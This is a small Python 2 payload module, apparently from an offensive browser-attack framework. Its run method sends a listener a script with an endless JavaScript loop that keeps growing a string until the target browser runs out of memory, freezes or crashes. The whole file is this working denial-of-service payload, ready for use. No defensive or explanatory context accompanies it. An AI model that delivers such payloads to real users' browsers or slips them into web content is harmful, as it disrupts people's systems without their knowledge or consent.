class Payload (object):
    def __init__(self, listener):
        self.listener = listener

    def run (self):

        from core.design.colors import YES

        DATA = '''
        <script>
            txt = "a";
            while (true){
                txt = txt += "a";
            }
        </script>
        '''

        self.listener.send_data (DATA)
        print YES + 'Data was sent'
